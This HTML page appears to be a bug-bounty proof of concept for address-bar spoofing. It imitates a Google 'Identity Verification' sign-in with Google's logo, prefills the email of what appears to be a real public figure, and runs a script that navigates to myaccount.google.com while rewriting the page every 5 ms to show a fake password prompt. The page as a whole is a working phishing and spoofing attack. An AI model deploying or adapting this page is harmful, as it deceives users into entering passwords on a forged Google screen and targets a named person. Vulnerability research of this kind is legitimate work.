<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>VRP Research</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 40px 20px; background: #fff; }
        .box { border: 1px solid #dadce0; padding: 25px; border-radius: 8px; max-width: 350px; margin: 0 auto; }
        .btn { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 4px; font-size: 16px; width: 100%; cursor: pointer; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
    </style>
</head>
<body>
    <div id="ui">
        <div class="box">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90">
            <h3>Identity Verification</h3>
            <p>Your session has expired. Please re-enter your password.</p>
            <input type="email" placeholder="Email" value="joshhawleyofficial@gmail.com">
            <input type="password" placeholder="Password">
            <button class="btn" id="go">Sign In</button>
        </div>
    </div>

    <script>
        document.getElementById('go').onclick = () => {
            const target = "https://myaccount.google.com/?pli=1";
            
            // 1. Trigger the navigation
            window.location.href = target;

            // 2. THE NUCLEAR LOOP
            // We are going to spam 'document.open' to keep the screen from clearing.
            // We do this for 4 seconds straight.
            const end = Date.now() + 4000;
            const timer = setInterval(() => {
                if (Date.now() > end) {
                    clearInterval(timer);
                    return;
                }
                
                // We overwrite the 'new' page with our 'old' content
                document.open();
                document.write(`
                    <div style="font-family:sans-serif; text-align:center; padding-top:100px;">
                        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90">
                        <h1>SPOOF ACTIVE</h1>
                        <p>If your URL bar says google.com, SCREENSHOT NOW.</p>
                        <input type="password" placeholder="Confirm Password">
                    </div>
                `);
                document.close();
            }, 5); // Run every 5 milliseconds
        };
    </script>
</body>
</html>
